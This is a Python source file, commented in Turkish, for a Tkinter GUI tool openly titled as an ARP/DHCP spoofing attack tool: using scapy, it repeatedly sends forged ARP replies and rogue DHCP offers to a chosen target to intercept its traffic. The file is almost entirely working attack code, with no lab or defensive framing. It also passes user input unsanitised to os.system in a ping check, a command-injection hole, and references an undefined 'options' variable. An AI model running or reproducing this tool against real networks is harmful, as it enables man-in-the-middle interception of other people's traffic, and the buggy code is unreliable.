import tkinter as tk
from tkinter import messagebox
import time
import argparse
import random
import ipaddress
import logging
import os
import re

import scapy.all as scapy

# Log dosyasının konumu
LOG_FILE = "arp_dhcp_spoof.log"

# Loglama yapılandırması
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

def validate_ip(ip):
    """
    IP adresinin doğruluğunu kontrol eder.
    Parametreler:
        ip: Kontrol edilecek IP adresi.
    Dönüş Değeri:
        IP adresi geçerliyse True, aksi takdirde False.
    """
    try:
        ipaddress.ip_network(ip)
        return True
    except ValueError:
        return False

def validate_mac(mac):
    """
    MAC adresinin doğruluğunu kontrol eder.

    Parametreler:
        mac: Kontrol edilecek MAC adresi.

    Dönüş Değeri:
        MAC adresi geçerliyse True, aksi takdirde False.
    """
    return bool(re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', mac))

def validate_gateway(gateway_ip):
    """
    Ağ geçidi IP adresinin erişilebilir olduğunu kontrol eder.

    Parametreler:
        gateway_ip: Kontrol edilecek ağ geçidi IP adresi.

    Dönüş Değeri:
        Ağ geçidi IP adresine erişilebiliyorsa True, aksi takdirde False.
    """
    response = os.system("ping -c 1 " + gateway_ip)
    return response == 0

def validate_interface(interface):
    """
    Ağ arayüzünün varlığını ve kullanılabilirliğini kontrol eder.

    Parametreler:
        interface: Kontrol edilecek ağ arayüzü.

    Dönüş Değeri:
        Ağ arayüzü kullanılabilirse True, aksi takdirde False.
    """
    interfaces = os.listdir('/sys/class/net/')
    return interface in interfaces

def get_target_macs(ip):
    """
    Hedef IP adresine bağlı olan tüm MAC adreslerini alır.

    Parametreler:
        ip: Hedef IP adresi.

    Dönüş Değeri:
        Hedef MAC adreslerinin bir listesi.
    """
    arp_result = scapy.arping(ip)
    return [res[1].hwsrc for res in arp_result[0]]

def get_mac(ip):
    """
    Belirtilen IP adresine ait MAC adresini alır.

    Parametreler:
        ip: Hedef IP adresi.

    Dönüş Değeri:
        IP adresine ait MAC adresi.
    """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    # İlk yanıtın MAC adresini döndür
    return answered_list[0][1].hwsrc if answered_list else None

def send_spoofed_packets(target_ip, spoof_ip, spoof_mac, attack_type):
    """
    Belirtilen saldırı türüne göre sahte ARP veya DHCP paketleri gönderir.

    Parametreler:
        target_ip: Hedef IP adresi.
        spoof_ip: Sahte IP adresi.
        spoof_mac: Sahte MAC adresi.
        attack_type: Saldırı türü ("arp" veya "dhcp").
    """
    try:
        if attack_type == "arp" or attack_type == "both":
            target_macs = get_target_macs(target_ip)
            for target_mac in target_macs:
                if not target_mac:
                    raise ValueError("ARP zehirleme saldırısı başarısız. Hedef MAC adresi alınamadı.")
                if not spoof_mac:
                    # Rastgele bir MAC adresi oluştur
                    spoof_mac = "02:" + ":".join([format(random.randint(0x00, 0xff), "02x") for _ in range(5)])
                packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
                scapy.send(packet, verbose=False)
                logging.info(f"ARP paketi gönderildi: Hedef IP: {target_ip}, Hedef MAC: {target_mac}, Sahte IP: {spoof_ip}, Sahte MAC: {spoof_mac}")
        if attack_type == "dhcp" or attack_type == "both":
            dhcp_spoof(target_ip, options.gateway, spoof_ip, spoof_mac)
            logging.info(f"DHCP paketi gönderildi: Hedef IP: {target_ip}, Ağ geçidi: {options.gateway}, Sahte IP: {spoof_ip}, Sahte MAC: {spoof_mac}")
    except Exception as e:
        logging.error("Saldırı sırasında bir hata oluştu:", exc_info=True)

def restore(destination_ip, source_ip, destination_mac=None, source_mac=None):
    """
    Belirtilen hedefe ve kaynağa ait ARP tablolarını geri yükler.

    Parametreler:
        destination_ip: Hedef IP adresi.
        source_ip: Kaynak IP adresi.
        destination_mac: Hedef MAC adresi (opsiyonel).
        source_mac: Kaynak MAC adresi (opsiyonel).
    """
    try:
        if not destination_mac:
            destination_mac = get_mac(destination_ip)
        if not source_mac:
            source_mac = get_mac(source_ip)
        if not destination_mac or not source_mac:
            raise ValueError("ARP tablolarını geri yüklerken hata oluştu. MAC adresleri alınamadı.")
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)
        logging.info(f"ARP tabloları geri yüklendi: Hedef IP: {destination_ip}, Hedef MAC: {destination_mac}, Kaynak IP: {source_ip}, Kaynak MAC: {source_mac}")
    except Exception as e:
        logging.error("ARP tablolarını geri yüklerken bir hata oluştu:", exc_info=True)

def dhcp_spoof(target_ip, gateway_ip, spoof_ip, spoof_mac=None):
    """
    Belirtilen hedefe sahte DHCP teklifleri gönderir.

    Parametreler:
        target_ip: Hedef IP adresi.
        gateway_ip: Ağ geçidi IP adresi.
        spoof_ip: Sahte IP adresi.
        spoof_mac: Sahte MAC adresi (opsiyonel).
    """
    try:
        # DHCP teklif paketi oluştur
        dhcp_offer = scapy.DHCP(options=[("message-type", "offer"), ("subnet_mask", "255.255.255.0"), ("router", gateway_ip), ("ip_address_lease_time", 600), ("domain", "localdomain"), ("broadcast_address", "192.168.1.255"), ("dns_server", gateway_ip), ("domain_name_server", gateway_ip), ("end")])
        dhcp_offer_packet = scapy.IP(src=gateway_ip, dst="255.255.255.255") / scapy.UDP(sport=67, dport=68) / scapy.BOOTP(op=2, ciaddr=target_ip, yiaddr=spoof_ip, siaddr=gateway_ip, chaddr=spoof_mac) / dhcp_offer
        scapy.send(dhcp_offer_packet, verbose=False)
    except Exception as e:
        logging.error("DHCP teklif paketi oluşturulurken bir hata oluştu:", exc_info=True)

def start_attack():
    target_ip = target_ip_entry.get()
    gateway_ip = gateway_ip_entry.get()
    spoof_ip = spoof_ip_entry.get()
    spoof_mac = spoof_mac_entry.get()
    interface = interface_entry.get()
    attack_type = attack_type_var.get()

    try:
        if not target_ip or not gateway_ip or not spoof_ip or not spoof_mac or not interface:
            messagebox.showerror("Hata", "Lütfen tüm alanları doldurun.")
            return

        if not validate_ip(target_ip):
            messagebox.showerror("Hata", "Geçersiz hedef IP adresi.")
            return

        if not validate_ip(gateway_ip):
            messagebox.showerror("Hata", "Geçersiz ağ geçidi (gateway) IP adresi.")
            return

        if not validate_gateway(gateway_ip):
            messagebox.showerror("Hata", "Ağ geçidi (gateway) IP adresine erişilemiyor.")
            return

        if not validate_ip(spoof_ip):
            messagebox.showerror("Hata", "Geçersiz sahte IP adresi.")
            return

        if not validate_mac(spoof_mac):
            messagebox.showerror("Hata", "Geçersiz sahte MAC adresi.")
            return

        if not validate_interface(interface):
            messagebox.showerror("Hata", "Belirtilen ağ arayüzü kullanılabilir değil.")
            return

        sent_packets_count = 0
        while True:
            send_spoofed_packets(target_ip, spoof_ip, spoof_mac, attack_type)
            sent_packets_count += 1
            attack_status_label.config(text=f"Paketler gönderiliyor: {sent_packets_count}")
            root.update()
            time.sleep(2)
    except KeyboardInterrupt:
        messagebox.showinfo("Bilgi", "Saldırı durduruluyor, orijinal ARP tabloları ve DHCP teklifleri geri yüklenecek...")
        restore(target_ip, spoof_ip)
        messagebox.showinfo("Bilgi", "Orijinal ARP tabloları ve DHCP teklifleri geri yüklendi.")
        logging.info("Orijinal ARP tabloları ve DHCP teklifleri geri yüklendi.")
        logging.info(f"Loglar \"{LOG_FILE}\" dosyasına kaydedildi.")
    except Exception as e:
        messagebox.showerror("Hata", f"Bir hata oluştu: {str(e)}")

# Tkinter uygulamasını oluştur
root = tk.Tk()
root.title("ARP/DHCP Spoofing Saldırı Aracı")

# Giriş etiketleri ve alanları
tk.Label(root, text="Hedef IP:").grid(row=0, column=0, sticky="e")
target_ip_entry = tk.Entry(root)
target_ip_entry.grid(row=0, column=1)

tk.Label(root, text="Ağ geçidi IP:").grid(row=1, column=0, sticky="e")
gateway_ip_entry = tk.Entry(root)
gateway_ip_entry.grid(row=1, column=1)

tk.Label(root, text="Sahte IP:").grid(row=2, column=0, sticky="e")
spoof_ip_entry = tk.Entry(root)
spoof_ip_entry.grid(row=2, column=1)

tk.Label(root, text="Sahte MAC:").grid(row=3, column=0, sticky="e")
spoof_mac_entry = tk.Entry(root)
spoof_mac_entry.grid(row=3, column=1)

tk.Label(root, text="Ağ Arayüzü:").grid(row=4, column=0, sticky="e")
interface_entry = tk.Entry(root)
interface_entry.grid(row=4, column=1)

# Saldırı türü seçimi
tk.Label(root, text="Saldırı Türü:").grid(row=5, column=0, sticky="e")
attack_type_var = tk.StringVar(root)
attack_type_var.set("arp")
attack_type_dropdown = tk.OptionMenu(root, attack_type_var, "arp", "dhcp", "both")
attack_type_dropdown.grid(row=5, column=1)

# Saldırı başlatma düğmesi
start_attack_button = tk.Button(root, text="Saldırıyı Başlat", command=start_attack)
start_attack_button.grid(row=6, columnspan=2)

# Saldırı durumu etiketi
attack_status_label = tk.Label(root, text="")
attack_status_label.grid(row=7, columnspan=2)

# Tkinter uygulamasını başlat
root.mainloop()
